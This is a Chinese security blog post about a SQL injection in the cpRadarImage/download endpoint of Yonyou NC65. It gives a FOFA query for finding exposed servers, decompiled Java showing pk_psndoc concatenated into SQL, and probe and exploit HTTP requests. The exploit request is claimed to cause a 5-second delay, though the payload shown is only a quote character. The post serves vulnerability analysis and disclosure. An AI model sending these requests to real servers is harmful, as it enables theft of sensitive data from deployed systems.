---
title: "用友NC cpRadarImage/download sql注入漏洞"
source: https://mrxn.net/jswz/yonyou-nc-cpRadarImage-download-pk_psndoc-sqli.html
asset_dir: assets/用友nc-cpradarimagedownload-sql注入漏洞
---

# 用友NC cpRadarImage/download sql注入漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/4/23 08:21
* 1081浏览
* [0评论](#comment)
* 1小时阅读

深入探索

SQL

服务器

软件


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

[用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B "用友")NC系统/portal/pt/cpRadarImage/download接口中的pk\_psndoc参数实现[sql注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)，从而窃取服务器的敏感信息。

编程

# 影响版本

NC65

# fofa语法

> `app="用友-UFIDA-NC"`

# 漏洞分析

深入探索

sql

安全工具开发

漏洞扫描服务

本来是根据官方[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E "漏洞")通告可知SQL注入点在 cpRadarImage 接口

[![用友NC cpRadarImage/download sql注入漏洞](images/img-001-2e06f0352513.webp)](https://image.mrxn.net/b167cbaa4b864789af5dc0ee8d14041e.webp)

因此搜索 cpRadarImage 方法的实现部分即可定位文件

代码安全审计

深入探索

身份验证

服务器安全服务

技术文章订阅

nc/bs/hrss/pub/action/CpRadarImageAction.class

```
package nc.bs.hrss.pub.action;

import java.io.File;
import java.io.FileInputStream;
import java.io.OutputStream;
import nc.bs.framework.common.RuntimeEnv;
import nc.bs.hrss.cp.cpAnalysis.CPAnalysisMngCataPanel;
import nc.bs.hrss.cp.cpPortlet.ctrl.CPPortletViewMain;
import nc.bs.hrss.pub.exception.HrssException;
import nc.uap.lfw.core.LfwRuntimeEnvironment;
import nc.uap.lfw.core.exception.LfwRuntimeException;
import nc.uap.lfw.servletplus.annotation.Action;
import nc.uap.lfw.servletplus.annotation.Servlet;
import nc.uap.lfw.servletplus.core.impl.BaseAction;
import nc.vo.hr.tools.formconfig.CodeGenUtils;
import nc.vo.ml.NCLangRes4VoTransl;
import org.apache.commons.io.IOUtils;
import org.apache.commons.lang.ArrayUtils;
import uap.lfw.core.ml.LfwResBundle;

@Servlet(
    path = "/cpRadarImage"
)
public class CpRadarImageAction extends BaseAction {
    public CpRadarImageAction() {
    }

    @Action
    public void download() {
        OutputStream out = null;
        byte[] pngBytes = null;

        try {
            this.request.setCharacterEncoding("UTF-8");
            String pk_psndoc = this.request.getParameter("pk_psndoc");
            String object_id = this.request.getParameter("object_id");
            String object_type = this.request.getParameter("object_type");
            String size = this.request.getParameter("size");
            FileInputStream finput = null;

            try {
                if ("0".equals(size)) {
                    pngBytes = CPPortletViewMain.queryRadarChartByCond(CPAnalysisMngCataPanel.POST, pk_psndoc, object_id);
                } else if ("1".equals(size)) {
                    pngBytes = CPPortletViewMain.queryRadarChartByCond(Integer.parseInt(object_type), pk_psndoc, object_id);
                } else if ("2".equals(size)) {
                    pngBytes = CPPortletViewMain.queryBigRadarChartByCond(Integer.parseInt(object_type), pk_psndoc, object_id, 680, 400, 340, 50);
                }

                if (ArrayUtils.isEmpty(pngBytes)) {
                    String themeId = LfwRuntimeEnvironment.getThemeId();
                    String strSrcDir = CodeGenUtils.buildFileURL(RuntimeEnv.getInstance().getNCHome(), new String[]{"hotwebs", "lfw", "frame", "device_pc", "themes", themeId, "ext", "hrss", "cp", "evalueRadar_image.png", ""});
                    File file = new File(strSrcDir);
                    finput = new FileInputStream(file);
                    pngBytes = new byte[finput.available()];
                }

                if (ArrayUtils.isEmpty(pngBytes)) {
                    throw new HrssException(NCLangRes4VoTransl.getNCLangRes().getStrByID("c_cp-res", "0c_cp-res0041"));
                }

                out = this.response.getOutputStream();
                this.response.setContentType("image/png");
                out.write(pngBytes);
                out.flush();
            } catch (HrssException e) {
                e.deal();
            } catch (Exception e) {
                (new HrssException(e)).deal();
            } finally {
                if (finput != null) {
                    finput.close();
                }

            }
        } catch (Exception e) {
            throw new LfwRuntimeException(LfwResBundle.getInstance().getStrByID("c_pub-res", "0c_pub-res0051"), e);
        } finally {
            IOUtils.closeQuietly(out);
        }

    }
}
```

pk\_psndoc 参数直接代入 CPPortletViewMain.queryRadarChartByCond 函数，其实现逻辑如下

漏洞预警服务

```
public byte[] queryRadarChartByCond(Integer object_type, String pk_psndoc, String object_id) throws BusinessException {
        GeneralVO[] indiResults = this.queryindiAnalysisResult(object_type, pk_psndoc, object_id);
        if (ArrayUtils.isEmpty(indiResults)) {
            return this.createSimpleChart(object_type, 400, 360, 200, 30);
        } else {
            AbilityMatchVO[] matchVOs = new AbilityMatchVO[indiResults.length];

            for(int i = 0; i < matchVOs.length; ++i) {
                matchVOs[i] = new AbilityMatchVO();
                matchVOs[i].setReqRank(new Double(indiResults[i].getAttributeValue("req_score").toString()));
                matchVOs[i].setActRank(new Double(indiResults[i].getAttributeValue("get_score").toString()));
                matchVOs[i].setIndiName((String)indiResults[i].getAttributeValue("indiname"));
            }

            return (new RadarChartViewer()).drawRadar(matchVOs, this.getRadarTitle(object_type), ResHelper.getString("6004matchay", "06004matchay0015"), 400, 360, 200, 30);
        }
    }
```

跟进 queryindiAnalysisResult 函数，其实现如下

计算机服务器

```
public GeneralVO[] queryindiAnalysisResult(Integer object_type, String pk_psndoc, String object_id) throws BusinessException {
        String psnjobsql = " hi_psnjob.ismainjob='Y' and hi_psnjob.endflag='N' and hi_psnjob.lastflag='Y' and hi_psnjob.pk_psndoc = '" + pk_psndoc + "'";
        PsnJobVO[] psnJobVOs = (PsnJobVO[])((IPersistenceRetrieve)NCLocator.getInstance().lookup(IPersistenceRetrieve.class)).retrieveByClause((String)null, PsnJobVO.class, psnjobsql);
        if (ArrayUtils.isEmpty(psnJobVOs)) {
            return null;
        } else {
            String pk_psnjob = psnJobVOs[0].getPk_psnjob();
            GeneralVO[] indiInfo = ((IMatchAnalyseQueryMaintain)NCLocator.getInstance().lookup(IMatchAnalyseQueryMaintain.class)).queryMatchObjPsnIndiResult((String)null, object_id, object_type, (String)null, pk_psnjob);
            return indiInfo;
        }
    }
```

直接将 pk\_psndoc 拼接进SQL语句中，然后将拼接后的SQL语句带入 retrieveByClause 函数后最终还是使用 executeQuery 来执行SQL语句，无任何过滤或校验，造成[SQL注入](https://mrxn.net/tag/sql%E6%B3%A8%E5%85%A5 "SQL注入")漏洞。

# 漏洞复现

可先通过如下请求来确定目标是否存在此接口及其响应，如果存在此模块，则会响应一个图片内容

SQL注入检测工具

```
GET /portal/pt/cpRadarImage/download?object_id=1&object_type=1&pageId=login&pk_psndoc=1&size=0 HTTP/1.1
Host: nc65.mrxn.net
```

[![用友NC cpRadarImage/download sql注入漏洞](images/img-002-1cb18172ed95.webp)](https://image.mrxn.net/4c643607620741a793e0b7c310931abd.webp)

[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)利用示例

```
GET /portal/pt/cpRadarImage/download?object_id=1&object_type=1&pageId=login&pk_psndoc=1'&size=0 HTTP/1.1
Host: nc65.mrxn.net
```

[![用友NC cpRadarImage/download sql注入漏洞](images/img-003-bc3ef645ff36.webp)](https://image.mrxn.net/1074b14a0e834701bcf2f872ab2ef880.webp)

成功延时 5 秒

编程

# 参考

* `https://security.yonyou.com/#/noticeInfo?id=568`

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#Java](https://mrxn.net/tag/Java)
* [#用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)
* [6.参考](#toc-6-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[用友NC cpRadarImage/download sql注入漏洞](https://mrxn.net/jswz/yonyou-nc-cpRadarImage-download-pk_psndoc-sqli.html)  
文章链接：<https://mrxn.net/jswz/yonyou-nc-cpRadarImage-download-pk_psndoc-sqli.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/yonyou-nc-cpRadarImage-download-pk\_psndoc-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

漏洞预警服务

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAABkCAYAAABw4pVUAAALFUlEQVR4Aeyci5LbuA5EffL//7w3cOfIIkRadh4zrrqaWmwL3Q2QJqSxnUrlx+12++934r/2Y49Gb73P+LN6dbH3q1xNLG4f8mdojb5VvuKt+x2sgfysu/77lBPYBvJz2rdXom8cuAGdvnPA1vNgaIRrA/daZfmew+hT3yPEA8FVL2vUIX75jhAdgl03t98Z6i/cBlLJFd9/AoeBQKYOI6626vTVIXWrXN46GP2dh+idtw9Eh/XT2GvPcnuvfPL6zhAee4TH9azuMJCZ6eK+7gT+2kBWd4085M7oL+1M1w9jvXXqe+wajLV77/6616nJw7yPuv4/wb82kD/ZxFX7OIG/NhDI3ePdIkJ4l4TkEJRf+eVF/TDWFw/hIFhcRa8tbh8QPwTP/Na+6tP/Cv61gbyy2OU5P4HDQJx6x1UrGO8q4MbP0L/qIw+p198RokNQ3foZds8qX/EwrgXJXQuSW3+G1nWc1R0GMjNd3NedwDYQyNThOb67NUi/d+u8m6zruTykPyB1QGD49g/J7QljfmhwQkDquw3Cw3Pc120D2ZPX9fedwA/vknfxbMuQu8K+7/phrIfkvY/9C7sGYw3M86qtgNf08lbA6Hf90n43rifEU/wQPB0I5C6AOXon+Hp6Lg+pX+kr3vqOkH5wxO7tuWuJK/1Vvvtg3FPXzSE+88LTgZTpiq87gR8wTgmSQ7BvZXVX6YPU/a4P5vWrfvIzdE9q5h0ha3Z+VQejXx+8xkN81u3XvZ6Q/Wl8wPX2KQvGqc2mV/uF+Op6H/Ae3/tD6jvvGsDwXWLl01945oHna1aPCoivrvfxav99TV0/q7uekDqhD4rDe4h7g9wVfZrmIsRnnQhzfqXbb6XLi3DsD+EguPLCe/qqz4r3tYj6RBjXly+8npA6hQ+K7T2kT3OVw3y63b96jTDWQ3IY8dV++3WsEffa/vpVHbIna60T5VcIYz0k7/UQHrhdT8jts35eHghkik4Xnuf6fLmrvPP6RRjXkbcOogNKGwL3T2Z6N+HNi14P6WublS4v6u+oXvjyQHqTK/83J7B9yoJx6jDmLg/ha5oVMM/1l6ei55A6+RVWbQXEX9cVK/8zvuoq9NR1hfm7CNnT79bBsf56Qt49zX/sXw6k7pyKvn5xFfJ1XWF+hpC7omoqILl1xVWYrxBSV16je+UhXpjgT67XQXzyMOb2VRdXPKS+6z2vPsuBlHjF15/A8nuIW4FxupBcXYTwTh2S